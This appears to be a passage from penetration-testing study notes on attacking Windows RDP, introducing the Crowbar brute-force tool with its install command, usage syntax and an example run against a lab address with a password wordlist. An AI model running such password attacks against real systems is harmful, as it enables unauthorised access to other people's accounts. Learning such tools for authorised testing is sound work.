### 2) RDP Exploitation

**Password Attacks with Crowbar**:
- Crowbar, formally known as Levye, is a network authentication cracking tool primarily designed to leverage SSH keys rather than passwords. It is one of the few tools that can reliably and efficiently perform password attacks against the Windows Remote Desktop Protocol (RDP) service on modern versions of Windows.
- installation: `sudo apt install crowbar`
- usage: `crowbar -b rdp -s <target_server> -u <username> -C <wordlist> -n <threads>`
- i.e. `crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
